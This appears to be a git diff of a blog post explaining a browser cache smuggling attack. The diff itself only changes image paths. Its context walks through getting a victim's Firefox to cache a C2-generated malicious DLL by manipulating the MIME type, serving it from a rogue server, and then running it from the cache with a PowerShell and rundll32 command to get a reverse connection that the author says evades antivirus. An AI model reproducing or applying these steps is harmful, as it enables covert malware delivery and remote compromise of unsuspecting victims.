@@ -29,11 +29,11 @@ When we visit any website  , there's lot of content that our browser fetches fro
 
 `C:\Users\szero\AppData\Local\Mozilla\Firefox\Profiles\i5se2r5j.default-release\cache2\entries` 
 
-![[Pasted image 20231025165334.png]]
+![[/assets/Cache Smuggling Attack/1025165334.png]]
 
 These files' names are randomly generate and stored to specific location by default without extension. For example , lets Clear these cache , and visit any website like google :
 
-![[Pasted image 20231025165703.png]]
+![[/assets/Cache Smuggling Attack/1025165703.png]]
 
 as you can see these are all the files that are cache by google, means these files are automatically save to local file system. 
 
@@ -42,17 +42,17 @@ If we just try to look from malicious perspective , our payload already gets sav
 
 Brower's by default do not cache any file that they fetch , actually browser's main engine look for `content-type` header from the response of the webserver. Example look at this from google.
 
-![[Pasted image 20231025170427.png]]
+![[/assets/Cache Smuggling Attack/1025170427.png]]
 
 Here we can see its `image/png` , This is called mime type. The webserver uses these own mechanism for defining mime types, means on severing which file what should be it's mime type. generally Linux based server used the file at `/etc/mime.types` to map the content-type with the file type . example , look at these mime type mapping with file type :
 
-![[Pasted image 20231025171156.png]]
+![[/assets/Cache Smuggling Attack/1025171156.png]]
 
 form above we can see that if our webserver is delivering the file type of com , exe or bat or even Dll . then its content type would be `application/x-msdos-program`  .
 
 Certain different Server use their own way of defining mime types , example nginx would use its own mime type file .
 
-![[Pasted image 20231025171547.png]]
+![[/assets/Cache Smuggling Attack/1025171547.png]]
 
 Now what if we manipulate the mime-type with wrong file type ?  you guessed it right !! Browser then can cache(save) our hosted data(malicious DLL here) as local copy !!  so we have to manipulate the mime-types for that ,  Once our malicious data gets cached by browser we just have to execute it on victim machine without worrying about the actually delivery of first staged payload !! 
 
@@ -60,7 +60,7 @@ Now again another problem, ok somehow we managed to cache the data !! what about
 
 So, when the browser keep the cache , apart from the original body of the cache data , it also stored HTTP headers along with cache data . so we can actually server our malicious payload with custom http header , that would provide us with ease to find the exact DLL file that we want to run. Example here we severed the data with custom http header `Tag: ENTERYPOINT`  , which will be cached by browser , then we can execute it by filtering on basis of this tag `ENTRYPOINT` . 
 
-![[Pasted image 20231025200839.png]]
+![[/assets/Cache Smuggling Attack/1025200839.png]]
 
 # How To Perform Browser Cache Smuggling
 
@@ -81,7 +81,7 @@ First , Generate the malicious DLL , you can use any C2 , i would be following H
 
 - Now we have generate our DLL by going to `attack -> Payload`  and configure the setting accordingly 
 
-![[Pasted image 20231025174208.png]]
+![[/assets/Cache Smuggling Attack/1025174208.png]]
 
 - Once we have our malicious DLL ready  , lets now move on to the step of manipulating the mime type of the server 
 
@@ -91,15 +91,15 @@ First , Generate the malicious DLL , you can use any C2 , i would be following H
 
 - Now lets Perform the attack with our malicious DLL like so : `python3 browsercachesmuggling.py --dll /root/smugglers.dll`
 
-![[Pasted image 20231025190619.png]]
+![[/assets/Cache Smuggling Attack/1025190619.png]]
 
 - It will server our malicious DLL . Now wait for the victim to visit your website . once victim visits your site . the DLL (which is hidden in browser page) will get cached by browser
 
-![[Pasted image 20231025191046.png]]
+![[/assets/Cache Smuggling Attack/1025191046.png]]
 
 - We will also gets logs when someone visits our Rouge server.
 
-![[Pasted image 20231025192341.png]]
+![[/assets/Cache Smuggling Attack/1025192341.png]]
 
 - Now since our DLL is cached by browser , we Now just have to run the following command on the victim to filter the specific DLL and execute it with `rundll32` .
 
@@ -109,7 +109,7 @@ foreach ($files in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-relea
 
 SO , This would Provide us with Reverse Connection !!
 
-![[Pasted image 20231025195326.png]]
+![[/assets/Cache Smuggling Attack/1025195326.png]]
 
 And as you can see we got reverse connection , also it doesn't flagged by AV engine !! 
 # Conclusion
